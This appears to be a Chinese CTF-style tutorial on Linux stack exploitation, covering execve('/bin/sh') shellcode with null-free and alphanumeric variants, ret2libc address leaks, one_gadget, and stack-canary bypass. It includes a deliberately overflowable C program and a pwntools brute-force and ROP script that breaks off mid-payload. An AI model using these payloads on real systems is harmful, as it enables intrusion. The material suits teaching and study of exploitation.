<h2 id="常用-shellcode"><a href="#常用-shellcode" class="headerlink" title="常用 shellcode"></a>常用 shellcode</h2><h3 id="执行-sh"><a href="#执行-sh" class="headerlink" title="执行 sh"></a>执行 sh</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shell32 = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, bits = <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">shell64 = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>

<p>pwntools 的 <code>shellcraft</code> 模块内置了执行 <code>sh</code> 的模板。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></div>

<h2 id="shellcode-绕过"><a href="#shellcode-绕过" class="headerlink" title="shellcode 绕过"></a>shellcode 绕过</h2><h3 id="长度判断绕过"><a href="#长度判断绕过" class="headerlink" title="长度判断绕过"></a>长度判断绕过</h3><p>有一些一些过滤 shellcode 函数的终止条件是出现 0 字符，因此我们需要让生成的 shellcode 的开头存在 0 字符且不影响 shellcode 正常执行。</p>
<p>策略是优先用<strong>寄存器形式</strong>的 <code>add</code>，避免对未知地址的内存读写，例如：<code>add al, al</code> → <code>00 C0</code></p>
<h3 id="0-截断绕过"><a href="#0-截断绕过" class="headerlink" title="0 截断绕过"></a>0 截断绕过</h3><p>对于 <code>strcpy</code> 等场景下需要 shellcode 能够不出现 0 字符，防止截断。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell32 = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor    eax, eax        /* eax=0 */</span></span><br><span class="line"><span class="string">    push   eax             /* NUL 终止 */</span></span><br><span class="line"><span class="string">    push   0x68732f2f      /* &quot;//sh&quot; */</span></span><br><span class="line"><span class="string">    push   0x6e69622f      /* &quot;/bin&quot; */</span></span><br><span class="line"><span class="string">    mov    ebx, esp        /* ebx=&amp;&quot;/bin//sh\0&quot; */</span></span><br><span class="line"><span class="string">    push   eax             /* argv[1]=NULL */</span></span><br><span class="line"><span class="string">    push   ebx             /* argv[0]=str */</span></span><br><span class="line"><span class="string">    pop    ecx             /* ecx=&amp;argv */</span></span><br><span class="line"><span class="string">    mov    al, 0xb         /* __NR_execve */</span></span><br><span class="line"><span class="string">    int    0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, bits = <span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shell32), shell32.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell64 = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push   59              /* rax=59 */</span></span><br><span class="line"><span class="string">    pop    rax</span></span><br><span class="line"><span class="string">    cdq                     /* edx=0 -&gt; rdx=0（32位写零扩展） */</span></span><br><span class="line"><span class="string">    push   rdx             /* NUL 终止 */</span></span><br><span class="line"><span class="string">    push   0x68732f2f      /* &quot;//sh&quot; */</span></span><br><span class="line"><span class="string">    push   0x6e69622f      /* &quot;/bin&quot; */</span></span><br><span class="line"><span class="string">    mov    rdi, rsp        /* rdi=&amp;&quot;/bin//sh\0&quot; */</span></span><br><span class="line"><span class="string">    push   rdx             /* argv[1]=NULL */</span></span><br><span class="line"><span class="string">    push   rdi             /* argv[0]=str */</span></span><br><span class="line"><span class="string">    pop    rsi             /* rsi=&amp;argv */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shell64), shell64.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>

<p>避免 <code>0x00</code> 的技巧：</p>
<ul>
<li>用 <strong><code>/bin//sh</code></strong> 拆成两次 <code>push imm32</code>，立即数无 0 字节，路径仍有效。</li>
<li>设系统调用号用 <strong><code>push imm8; pop rax/eax</code></strong> 或 **<code>mov al,imm8</code>**（避免 <code>mov r*, imm32/64</code> 带来的零字节）。</li>
<li>清零寄存器优先用 **<code>xor reg,reg</code>**（2B）或 **<code>cdq</code>**（amd64 下一字节 0x99，可零出 <code>rdx</code>）。</li>
<li>用栈构造 <code>argv=[str,NULL]</code>：<code>push 0; push str; pop ecx/rsi</code>，避免 <code>mov ecx/rsi, rsp</code> 时可能更长。</li>
<li>需要构造含零的内存常量时，可用 <strong>异或写入</strong>：<code>push 0x01010101</code> + <code>xor dword ptr [esp], imm32</code>，指令本身不含 <code>0x00</code>。</li>
</ul>
<h3 id="可见字符绕过"><a href="#可见字符绕过" class="headerlink" title="可见字符绕过"></a>可见字符绕过</h3><p>有些题目会过滤 shellcode 的字符，通常情况下会限制 shellcode 中仅包含课件字符。<a class="link"   target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3" >alpha3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 项目可以实现可见 shellcode 。</p>
<p>首先我们需要先生成一个 shellcode 文件：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> fp: fp.write(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push   59              /* rax=59 */</span></span><br><span class="line"><span class="string">    pop    rax</span></span><br><span class="line"><span class="string">    cdq                     /* edx=0 -&gt; rdx=0（32位写零扩展） */</span></span><br><span class="line"><span class="string">    push   rdx             /* NUL 终止 */</span></span><br><span class="line"><span class="string">    push   0x68732f2f      /* &quot;//sh&quot; */</span></span><br><span class="line"><span class="string">    push   0x6e69622f      /* &quot;/bin&quot; */</span></span><br><span class="line"><span class="string">    mov    rdi, rsp        /* rdi=&amp;&quot;/bin//sh\0&quot; */</span></span><br><span class="line"><span class="string">    push   rdx             /* argv[1]=NULL */</span></span><br><span class="line"><span class="string">    push   rdi             /* argv[0]=str */</span></span><br><span class="line"><span class="string">    pop    rsi             /* rsi=&amp;argv */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> fp: fp.write(shellcode)</span><br></pre></td></tr></table></figure></div>

<p>之后运行 alpha3 项目根路径下的 <code>ALPHA3.py</code> 将生成的 shellcode 文件中的 shellcode 转换成可见字符 shellcode。该文件中的可用参数如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Usage: ALPHA3.py [ encoder settings | I/O settings | flags ]</span><br><span class="line"></span><br><span class="line">Encoder setting:</span><br><span class="line">  architecture       x86 | x64</span><br><span class="line">  character encoding ascii | cp437 | latin-1 | utf-16</span><br><span class="line">  casing             uppercase | mixedcase | lowercase</span><br><span class="line">  base address       针对所选编码器可用的一组“基址/地址模式”（见下表）</span><br><span class="line"></span><br><span class="line">I/O settings:</span><br><span class="line">  --input=&quot;file&quot;     从文件读取原始 shellcode（默认 stdin）</span><br><span class="line">  --output=&quot;file&quot;    将结果写入文件（默认 stdout）</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  --verbose          输出更详细的信息（重复两次可显示编码进度）</span><br><span class="line">  --help             显示帮助并退出（可与 Encoder setting 联用做过滤）</span><br><span class="line">  --test             运行所有可用测试（或基于 Encoder setting 的过滤子集）</span><br><span class="line">  --int3             在测试样例执行前注入 int3 断点（配合 --test）</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>ALPHA3.py</code> 仅支持 python2。</p>

    </div>
  </div>

<p>alpha3 项目支持下面几种组合：</p>
<table>
<thead>
<tr>
<th>架构</th>
<th>编码</th>
<th>大小写</th>
<th>编码器名称（示例）</th>
</tr>
</thead>
<tbody><tr>
<td>x64</td>
<td>ASCII</td>
<td>mixed‑case</td>
<td><strong>AscMix (r64)</strong></td>
</tr>
<tr>
<td>x86</td>
<td>ASCII</td>
<td>lowercase</td>
<td><strong>AscLow 0x30</strong></td>
</tr>
<tr>
<td>x86</td>
<td>ASCII</td>
<td>mixed‑case</td>
<td><strong>AscMix 0x30 &#x2F; Countslide &#x2F; SEH GetPC &#x2F; (i32)</strong></td>
</tr>
<tr>
<td>x86</td>
<td>ASCII</td>
<td>uppercase</td>
<td><strong>AscUpp 0x30</strong></td>
</tr>
<tr>
<td>x86</td>
<td>Latin‑1</td>
<td>mixed‑case</td>
<td><strong>Latin1Mix CALL GetPC</strong></td>
</tr>
<tr>
<td>x86</td>
<td>UTF‑16</td>
<td>uppercase</td>
<td><strong>UniUpper 0x10</strong></td>
</tr>
</tbody></table>
<p>例如（这里的 <code>--input=shellcode</code> 表示前面我们生成的文件 <code>shellcode</code> 的路径）：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=shellcode</span><br><span class="line">python2 ./ALPHA3.py x86 ascii mixedcase eax --input=shellcode</span><br></pre></td></tr></table></figure></div>

<p><strong>哪一个寄存器在跳到 shellcode 前就已经指向你的 shellcode，基址就写谁</strong>。例如你用 <code>call rax</code> 进入 shellcode，就选 <code>rax</code>。</p>
<p>常用的几段 shellcode：</p>
<ul>
<li><p>32 位（72 字节，<code>eax</code>）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hffffk4diFkTpj02Tpk0T0AuEE0t402D1l7O7M070Y142x2M1n2C4y3D1P2j0h4D094u4r0M</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>64 位（107 字节，<code>rax</code>）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G197O380k1o1P7L0K0X137N2m0X7n1O3U3G2y0g167n0607</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>64 位（107字节，<code>rdi</code>）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G197O380k1o1P7L0K0X137N2m0X7n1O3U3G2y0g167n0607</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="linux延迟绑定机制"><a href="#linux延迟绑定机制" class="headerlink" title="linux延迟绑定机制"></a>linux延迟绑定机制</h2><p>动态链接每个函数需要两个东西：</p>
<ul>
<li><p>用来存放外部函数地址的数据段</p>
</li>
<li><p>用来获取数据段记录的外部函数地址的代码</p>
</li>
</ul>
<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/71e04df6969db4f75dcf43f09246a92b.png"
                      alt="图片"
                ></p>
<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址。</p>
<p>在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>举例：</p>
<p>第一次调用<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/5dfa1cfa3febe69de060b44636b1d515.png"
                     
                ><br>之后再次调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/c1fdf7342f4974e396840a515fd5cafe.png"
                     
                ></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="泄露函数地址"><a href="#泄露函数地址" class="headerlink" title="泄露函数地址"></a>泄露函数地址</h3><p>泄露libc函数地址的条件：程序中有输出函数，例如puts&#x2F;printf&#x2F;write</p>
<p>以<code>write(1,buf,20)</code>为例：</p>
<ul>
<li><p>32位</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/467d83f627ee475bff7982574983ebbb.png"
                      alt="image-20220201201536794"
                ></p>
</li>
<li><p>64位</p>
<p>需要控制三个参数，rdi，rsi，rdx</p>
<p>第三个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/d0960c383618941fa65bf62b257c8f79.png"
                     
                ></p>
<p>  截取泄露的函数地址</p>
<ul>
<li><p>32位</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>64位</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>特别得，对于printf输出数字结果，不需要小端序转换，<code>[:-1]</code>是为了去掉最后的回车</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><ul>
<li><p>LibcSearcher</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ELF</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbol[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">ayatem_addr = libc_base + libc.symbol[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="构造rop获取shell"><a href="#构造rop获取shell" class="headerlink" title="构造rop获取shell"></a>构造rop获取shell</h3><p>  system函数调用过程。</p>
<p>  另外，可以<code>one_gadget</code>查找已知的libc中<code>exevce(&quot;/bin/sh&quot;)</code>语句的地址。</p>
  <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">one_gadget libc-2.23.so</span></span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></div>

<h1 id="canary-绕过"><a href="#canary-绕过" class="headerlink" title="canary 绕过"></a>canary 绕过</h1><h2 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h2><ul>
<li>利用栈溢出泄露canary<br>canary 以 <code>\x00</code> 结尾，通过栈溢出覆盖 canary 最低字节，之后输出输入内容时会连带将 canary 一同输出。</li>
<li>利用格式化字符串漏洞泄露 canary。</li>
</ul>
<p>  由于 canary 存储在栈上，因此很容易就可以利用格式化字符串漏洞泄露。</p>
<h2 id="逐字节爆破"><a href="#逐字节爆破" class="headerlink" title="逐字节爆破"></a>逐字节爆破</h2><p>例如下面的程序：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input:&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">vuln</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <strong>fork 产生的子进程的 canary 与父进程相同</strong>，因此可以根据子进程是否打印报错信息来逐字节爆破 canary 。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"> </span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"> </span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">    info(<span class="built_in">len</span>(canary))</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.sendafter(<span class="string">&quot;please input:\n&quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x108</span> + canary + p8(c))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> p.recvline_contains(<span class="string">&#x27;stack smashing detected&#x27;</span>, timeout=<span class="number">1</span>):</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">canary = u64(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004493d7</span>)  <span class="comment"># pop rax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004437a0</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004018c2</span>)  <span class="comment"># pop rdi ; ret</span></span><br><span 